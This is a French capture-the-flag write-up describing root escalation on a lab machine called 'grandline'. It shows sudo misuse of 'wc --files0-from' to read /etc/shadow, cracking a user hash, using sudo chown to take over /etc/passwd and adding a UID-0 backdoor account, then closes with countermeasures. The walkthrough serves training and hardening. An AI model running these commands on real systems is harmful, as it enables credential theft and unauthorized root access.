---
author: Wallygator
date: 2026-10-06
version: 1.0.0
modification: Harmonisation du write-up
cve: Aucun CVE produit applicable ; CWE-732 et CWE-269
---

# Documentation : Grandline (Partie 2)
# Documentation : Grandline (Partie 2)

## 1. Contexte & Objectif

Après avoir récupéré le flag utilisateur, on passe à l'escalade de privilèges.

* **Compte initial** : `zoro`
* **Objectif** : obtenir un accès `root` et récupérer le flag final.

---

## 2. Vérification des privilèges sudo

On commence par regarder ce que `zoro` peut exécuter :

```bash
sudo -l
```

Résultat :

```text
User zoro may run the following commands on grandline:
    (root) NOPASSWD: /usr/bin/wc
```

`zoro` peut donc lancer `wc` comme root, mais pas directement `bash`, `cat`, `find`, etc.

---

## 3. Faiblesse exploitée : `wc`

GNU `wc` accepte l'option :

```text
--files0-from=FILE
```

Cette option lit une liste de chemins à partir d'un fichier. En pratique, avec des privilèges root, cela permet de faire des lectures de fichiers sensibles de manière indirecte.

C'est une primitive très utile dans ce type de challenge.

---

## 4. Lecture de `/etc/shadow`

On exécute :

```bash
sudo /usr/bin/wc --files0-from=/etc/shadow
```

Cela permet de récupérer des informations sensibles, notamment le hash du compte `luffy` :

```text
luffy:$y$j9T$...:...
```

Ce hash est un hash `yescrypt`.

---

## 5. Crack du mot de passe `luffy`

Le hash est ensuite cracké avec John the Ripper.

Résultat :

```text
luffy:onepiece
```

On peut donc passer sur le compte `luffy` :

```bash
su - luffy
```

---

## 6. Nouvelle escalade de privilèges

On vérifie les droits sudo du compte `luffy` :

```bash
sudo -l
```

Résultat :

```text
User luffy may run the following commands on grandline:
    (root) NOPASSWD: /bin/chown
```

`luffy` peut donc exécuter `chown` en tant que root.

---

## 7. Exploitation de `chown`

On modifie le propriétaire du fichier important `/etc/passwd` :

```bash
sudo /bin/chown luffy:luffy /etc/passwd
```

Ensuite on ajoute une entrée utilisateur avec `UID 0` :

```text
pwned:$6$...:0:0:pwned:/root:/bin/bash
```

Cela crée un compte équivalent à un compte root.

---

## 8. Obtenir un shell root

On passe sur ce compte :

```bash
su - pwned
```

Mot de passe :

```text
Root123!
```

Vérification :

```bash
whoami
id
```

Résultat :

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

---

## 9. Recherche du flag root

On cherche le flag dans `/root` :

```bash
ls -la /root
```

On trouve le fichier :

```text
/root/ThisIsATre4sureDidYouExpectRootDotTXT.txt
```

On le lit :

```bash
cat /root/ThisIsATre4sureDidYouExpectRootDotTXT.txt
```

## 10. Contre-mesures

### Règle sudo sur `wc`

- Ne pas autoriser un binaire multifonction comme `wc` avec `NOPASSWD` si un script dédié suffit.
- Restreindre la commande à des fichiers et arguments fixes via un wrapper root non modifiable.
- Auditer les règles sudo avec une approche de moindre privilège.

### Règle sudo sur `chown`

- Ne jamais permettre à un utilisateur non privilégié de changer le propriétaire de fichiers système.
- Interdire toute modification indirecte de `/etc/passwd`, `/etc/shadow` et des fichiers de configuration sensibles.
- Surveiller les changements de propriétaires et de permissions sur les fichiers système.